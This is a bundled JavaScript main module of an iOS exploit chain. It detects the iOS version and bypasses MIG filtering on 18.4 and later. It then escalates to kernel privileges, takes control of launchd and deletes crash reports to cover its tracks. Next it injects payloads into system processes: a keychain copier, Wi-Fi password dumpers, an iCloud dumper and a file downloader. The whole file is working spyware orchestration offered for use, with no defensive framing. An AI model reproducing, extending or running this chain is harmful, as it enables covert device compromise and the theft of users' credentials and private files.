(() => {
/*!*********************!*
  !*** ./src/main.js ***!
  \*********************/
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/TaskRop/TaskRop */ "./src/libs/TaskRop/TaskRop.js");
/* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/TaskRop/Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/TaskRop/Sandbox */ "./src/libs/TaskRop/Sandbox.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _InjectJS__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./InjectJS */ "./src/InjectJS.js");
/* harmony import */ var libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! libs/Driver/Driver */ "./src/libs/Driver/Driver.js");
/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! libs/TaskRop/RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! !raw-loader!../dist/MigFilterBypassThread.js */ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js");
/* harmony import */ var _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! !raw-loader!loader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js");
/* harmony import */ var _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! !raw-loader!file_downloader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/file_downloader.js");
/* harmony import */ var _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! !raw-loader!keychain_copier.js */ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js");
/* harmony import */ var _raw_loader_wifi_password_dump_js__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! !raw-loader!wifi_password_dump.js */ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_dump.js");
/* harmony import */ var _raw_loader_wifi_password_securityd_js__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! !raw-loader!wifi_password_securityd.js */ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_securityd.js");
/* harmony import */ var _raw_loader_icloud_dumper_js__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__(/*! !raw-loader!icloud_dumper.js */ "./node_modules/raw-loader/dist/cjs.js!./src/icloud_dumper.js");

// --- FIX: Create readable aliases for Webpack modules ---
const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
const Chain = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"];
const TaskRop = libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"];
const Task = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"];
const Sandbox = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"];
const Utils = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__["default"];
const InjectJS = _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"];
const Driver = libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__["default"];
const RemoteCall = libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"];
const MigFilterBypassThreadCode = _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
const loaderCode = _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"];
const fileDownloaderCode = _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__["default"];
const keychainCopierCode = _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__["default"];
const wifiPasswordDumpCode = _raw_loader_wifi_password_dump_js__WEBPACK_IMPORTED_MODULE_13__["default"];
const wifiPasswordSecuritydCode = _raw_loader_wifi_password_securityd_js__WEBPACK_IMPORTED_MODULE_14__["default"];
const iCloudDumperCode = _raw_loader_icloud_dumper_js__WEBPACK_IMPORTED_MODULE_15__["default"];
// ---------------------------------------------------------

class MigFilterBypass {

	#running;
	#sharedMem;
	#runFlagPtr;
	#isRunningPtr;
	#monitorThread1Ptr;
	#monitorThread2Ptr;
	#mutexPtr;

	constructor(mutexPtr) {
		this.#mutexPtr = mutexPtr;
		this.#running = false;
		this.#sharedMem = BigInt(Native.callSymbol("calloc", 1, 0x100));
		this.#runFlagPtr = this.#sharedMem;
		this.#isRunningPtr = this.#sharedMem + 0x4n;
		this.#monitorThread1Ptr = this.#sharedMem + 0x8n;
		this.#monitorThread2Ptr = this.#sharedMem + 0x10n;
		Native.write32(this.#runFlagPtr, 2);
		Native.write32(this.#isRunningPtr, 0);
	}

	start() {
		if (this.#running)
			return;

		let threadSelf = BigInt(Native.callSymbol("mach_thread_self"));
		let threadSelfAddr = BigInt(Task.getPortKObject(threadSelf));


		let threadMem = BigInt(Native.callSymbol("calloc", 1, 0x400));
		let kernelRW = Chain.transferRW();
		let kernelBase = BigInt(Chain.getKernelBase());
		Native.write64(threadMem, BigInt(kernelRW.controlSocket));
		Native.write64(threadMem + 0x8n, BigInt(kernelRW.rwSocket));
		Native.write64(threadMem + 0x10n, kernelBase);
		Native.write64(threadMem + 0x18n, threadSelfAddr);
		Native.write64(threadMem + 0x20n, this.#runFlagPtr);
		Native.write64(threadMem + 0x28n, this.#isRunningPtr);
		Native.write64(threadMem + 0x30n, this.#mutexPtr);
		Native.write64(threadMem + 0x38n, BigInt(Chain.offsets().migLock));
		Native.write64(threadMem + 0x40n, BigInt(Chain.offsets().migSbxMsg));
		Native.write64(threadMem + 0x48n, BigInt(Chain.offsets().migKernelStackLR));
		Native.write64(threadMem + 0x50n, this.#monitorThread1Ptr);
		Native.write64(threadMem + 0x58n, this.#monitorThread2Ptr);

		const threadCode = "fcall_init(); " + MigFilterBypassThreadCode;
		Chain.threadSpawn(threadCode, threadMem);

		// FIX: Replaced fixed loop with a more robust while loop and timeout.
		// NOTE: This is still polling, but it's more reliable than a fixed-iteration for-loop.
		console.log(TAG, "Waiting for MigFilterBypass thread to start...");
		let isRunning = 0;
		const timeoutMs = 5000;
		let elapsedMs = 0;
		while (!(isRunning = Native.read32(this.#isRunningPtr)) && elapsedMs < timeoutMs) {
			Native.callSymbol("usleep", 100000); // Sleep 100ms
			elapsedMs += 100;
		}

		if (!isRunning) {
			console.error(TAG, "TIMEOUT: MigFilterBypass thread failed to start within ${timeoutMs}ms.");
		} else {
			console.log(TAG, "MigFilterBypass thread started successfully.");
		}

		this.#running = true;
	}

	stop() {
		if (!this.#running)
			return;

		Native.write32(this.#runFlagPtr, 0);
		Native.callSymbol("sleep", 1);
		this.#running = false;
	}

	pause() {
		Native.write32(this.#runFlagPtr, 2);
		Native.callSymbol("sleep", 1);
	}

	resume() {
		Native.write32(this.#runFlagPtr, 1);
		Native.callSymbol("sleep", 1);
	}

	monitorThreads(thread1, thread2) {
		Native.write64(this.#monitorThread1Ptr, thread1);
		Native.write64(this.#monitorThread2Ptr, thread2);
	}
}
function xnuVersion() {
	Native.callSymbol("uname", Native.mem);
	const release = Native.readString(Native.mem + 0x200n, 0x100);
	let splittedVersion = release.split(".");
	let xnuMajor = splittedVersion[0];
	let xnuMinor = splittedVersion[1];
	return {major: xnuMajor, minor: xnuMinor};
}

const TAG = "MAIN";
const targetProcess = "SpringBoard";

function start() {
	let mutexPtr = null;
	let migFilterBypass = null;
	globalThis.xnuVersion = xnuVersion();
	let ver = globalThis.xnuVersion;

	// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
	if (ver.major == 24 && ver.minor >= 4) {
		console.log(TAG, "iOS >= 18.4 detected, initializing MigFilterBypass.");
		mutexPtr = BigInt(Native.callSymbol("malloc", 0x100));
		Native.callSymbol("pthread_mutex_init", mutexPtr, null);
		migFilterBypass = new MigFilterBypass(mutexPtr);
	}
	let driver = new Driver();

	Chain.init(driver, mutexPtr);

	let resultPE = Chain.runPE();
	if (!resultPE) {
		console.error(TAG, "Privilege Escalation failed. Aborting.");
		return false;
	}


	TaskRop.init();
	if(migFilterBypass)
		migFilterBypass.start();
	
	let launchdTask = new RemoteCall("launchd", migFilterBypass);
	if (!launchdTask.success()) {
		console.error(TAG, "Failed to get a handle on launchd. Aborting.");
		return false;
	}

	Sandbox.initWithLaunchdTask(launchdTask);
	Sandbox.deleteCrashReports();
	Sandbox.createTokens();

	let agentLoader = new InjectJS(targetProcess, loaderCode, migFilterBypass);
	if (agentLoader.inject()) {
		console.log(TAG, `Successfully injected agent loader into ${targetProcess} (PID: ${agentLoader.task.pid()})`);
		Sandbox.applyTokensForRemoteTask(agentLoader.task);
		Sandbox.adjustMemoryPressure(targetProcess);
		agentLoader.destroy();
	} else {
		console.error(TAG, `Failed to inject agent loader into ${targetProcess}.`);
	}

	// Inject keychain copier FIRST into securityd (has access to keychain files)
	const keychainProcess = "configd";
	let keychainCopier = new InjectJS(keychainProcess, keychainCopierCode, migFilterBypass);
	if (keychainCopier.inject()) {
		console.log(TAG, `Successfully injected keychain copier into ${keychainProcess}.`);
		Sandbox.applyTokensForRemoteTask(keychainCopier.task);
		keychainCopier.destroy();
	} else {
		console.error(TAG, `Failed to inject keychain copier into ${keychainProcess}.`);
	}

	// Inject WiFi password dump into wifid (has keychain access for WiFi)
	const wifidProcess = "wifid";
	let wifiDump = new InjectJS(wifidProcess, wifiPasswordDumpCode, migFilterBypass);
	if (wifiDump.inject()) {
		console.log(TAG, `Successfully injected wifi dumper into ${wifidProcess}.`);
		Sandbox.applyTokensForRemoteTask(wifiDump.task);
		wifiDump.destroy();
	} else {
		console.error(TAG, `Failed to inject wifi dumper into ${wifidProcess}.`);
	}

	// Also inject WiFi password dump into securityd (fallback for devices where wifid fails)
	const securitydProcess = "securityd";
	let wifiDumpSecurityd = new InjectJS(securitydProcess, wifiPasswordSecuritydCode, migFilterBypass);
	if (wifiDumpSecurityd.inject()) {
		console.log(TAG, `Successfully injected wifi dumper (fallback) into ${securitydProcess}.`);
		Sandbox.applyTokensForRemoteTask(wifiDumpSecurityd.task);
		wifiDumpSecurityd.destroy();
	} else {
		console.error(TAG, `Failed to inject wifi dumper (fallback) into ${securitydProcess}.`);
	}

	// Inject iCloud dumper into UserEventAgent (has access to iCloud Drive files)
	const userEventAgentProcess = "UserEventAgent";
	let iCloudDumper = new InjectJS(userEventAgentProcess, iCloudDumperCode, migFilterBypass);
	if (iCloudDumper.inject()) {
		console.log(TAG, `Successfully injected iCloud dumper into ${userEventAgentProcess}.`);
		Sandbox.applyTokensForRemoteTask(iCloudDumper.task);
		iCloudDumper.destroy();
	} else {
		console.error(TAG, `Failed to inject iCloud dumper into ${userEventAgentProcess}.`);
	}

	// NOTE: This fixed sleep is a potential race condition.
	// The script assumes 5 seconds is enough for all dumpers to complete their tasks.
	// A more robust solution would involve checking for completion flags from each payload.
	console.log(TAG, "Waiting 5 seconds for dumpers to finish...");
	for (let i = 1; i <= 5; i++) {
		Native.callSymbol("sleep", 1);
	}
	console.log(TAG, "Wait finished.");

	// Inject forensics file downloader AFTER keychain copier
	try {
		let fileDownloader = new InjectJS(targetProcess, fileDownloaderCode, migFilterBypass);
		if (fileDownloader.inject()) {
			console.log(TAG, `Successfully injected file downloader into ${targetProcess}.`);
			Sandbox.applyTokensForRemoteTask(fileDownloader.task);
			fileDownloader.destroy();
		} else {
			console.error(TAG, `Failed to inject file downloader into ${targetProcess}.`);
		}
	} catch (injectError) {
		// FIX: Added error logging
		console.error(TAG, `An error occurred during file downloader injection:`, injectError);
	}

	launchdTask.destroy();

	return true;
}

try {
	console.log(TAG, "Starting exploitation chain...");
	const success = start();
	console.log(TAG, `Exploitation chain finished with status: ${success ? 'SUCCESS' : 'FAILURE'}`);
}
catch (error) {
	// FIX: Added error logging
	console.error(TAG, "A critical error occurred in the main execution block:", error);
}
finally {
	console.log(TAG, "Exiting process.");
	Native.callSymbol("exit", 0n);
}

})();
